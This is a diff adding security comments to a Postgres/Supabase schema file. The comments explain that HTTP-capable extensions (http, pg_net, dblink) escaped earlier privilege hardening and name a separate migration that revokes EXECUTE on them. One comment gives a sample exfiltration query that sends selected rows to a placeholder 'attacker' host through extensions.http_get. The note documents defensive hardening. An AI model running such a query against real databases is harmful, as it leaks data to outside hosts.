@@ -65,3 +65,23 @@ alter default privileges for role postgres in schema public revoke execute on fu
 alter default privileges for role postgres in schema public grant all on tables to service_role;
 alter default privileges for role postgres in schema public grant all on sequences to service_role;
 alter default privileges for role postgres in schema public grant all on functions to service_role;
+
+--
+-- Network-capable extensions
+--
+-- The hardening above is scoped `in schema public`, so it never touched
+-- `extensions` or `net` — where the outbound-HTTP functions live. A plain
+-- `SELECT extensions.http_get('http://attacker/?d=' || (SELECT ...))` is a
+-- syntactically read-only statement that satisfies RLS and still posts the
+-- rows off-box. The boundary is EXECUTE, not the SQL parser.
+--
+-- ⚠️ The enforcement is the hand-written migration
+-- `20260911130000_revoke_network_extension_privileges.sql`, NOT this file.
+-- The revoke has to iterate `pg_depend` to cover every member of the `http`,
+-- `pg_net` and `dblink` extensions (the member list changes with the extension
+-- version, so a static list fails open), and `supabase db diff` does not emit
+-- DO blocks. This comment records the intent; change both together.
+--
+-- USAGE on `extensions` is deliberately KEPT: `companies.website` and
+-- `sales.email` are `extensions.citext`, and filtering them resolves the
+-- `citext = citext` operator by name, which requires schema USAGE.
